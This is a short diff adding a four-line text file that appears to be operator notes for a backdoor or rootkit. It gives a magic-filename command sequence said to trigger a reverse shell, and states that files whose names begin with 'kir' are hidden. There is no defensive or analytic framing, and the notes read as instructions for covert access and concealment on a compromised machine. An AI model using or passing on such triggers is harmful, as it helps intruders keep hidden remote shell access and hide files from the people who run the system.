@@ -1,0 +1,4 @@
+Get a reverse shell with:
+touch __UNO & ls & rm __UNO
+hide files:
+files beginning wit kir are hidden
